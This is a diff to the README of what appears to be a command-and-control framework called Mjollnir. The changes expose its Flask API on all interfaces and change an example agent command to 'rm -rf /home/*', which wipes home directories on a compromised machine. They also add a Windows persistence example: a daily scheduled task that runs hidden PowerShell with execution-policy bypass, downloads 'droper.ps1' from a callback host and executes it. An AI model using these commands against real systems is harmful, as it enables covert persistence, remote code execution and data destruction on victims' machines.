@@ -15,7 +15,7 @@ Then start the api:
 $ cd mjollnir-c2-pub
 $ export FLASK_DEBUG=1
 $ export FLASK_APP=mjollnir_api
-$ flask run
+$ flask run -h 0.0.0.0 -p 5000
 ```
 
 Eventually start the cli:
@@ -100,7 +100,7 @@ You could interact with an agent using:
 
 ```
 Mjollnir > agent -i <agent_uid>
-Mjollnir > CMD whoami; touch hello; rm -f /home/* (read carrefully before copy-paste)
+Mjollnir > CMD whoami; touch hello; rm -rf /home/* (read carrefully before copy-paste)
 Mjollnir > group <new_group_name>
 ```
 
@@ -125,6 +125,12 @@ For this you need the agent name. So before you would like to:
 ```
 Mjollnir > agent
 Mjollnir > list
+```
+
+Then for example set a scheduled task like:
+```
+CMD SCHTASKS /CREATE /SC DAILY /TN "MyTasks\my task" /TR "powershell.exe -ep bypass -w 1 -nop $e=(New-Object System.Net.WebClient).DownloadString(\\\"http://192.168.0.129:5000/publi
+c/droper.ps1\\\");IEX $e" /ST 9:21
 ```
 
 # Group task
